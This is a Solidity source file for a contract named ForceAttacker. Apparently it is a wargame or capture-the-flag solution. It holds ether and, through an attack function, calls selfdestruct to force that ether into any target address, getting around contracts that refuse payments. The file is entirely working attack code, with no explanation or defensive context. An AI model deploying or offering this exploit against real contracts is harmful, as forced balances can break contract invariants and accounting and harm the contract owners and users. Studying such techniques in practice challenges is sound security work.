pragma solidity 0.8.15;

contract ForceAttacker {
    constructor() payable {}

    function attack(address target) external {
        selfdestruct(payable(target));
    }
}